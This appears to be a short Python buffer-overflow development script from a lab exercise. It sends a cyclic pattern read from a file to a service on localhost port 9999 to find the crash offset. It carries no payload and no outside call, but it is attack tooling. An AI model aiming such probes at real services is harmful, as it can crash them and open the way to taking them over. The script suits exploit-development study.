import socket
import time

target = '127.0.0.1'
port = 9999

with open("pattern.txt") as f:
    buffer = f.read().strip().encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send((b"                          >> " + buffer))
s.close()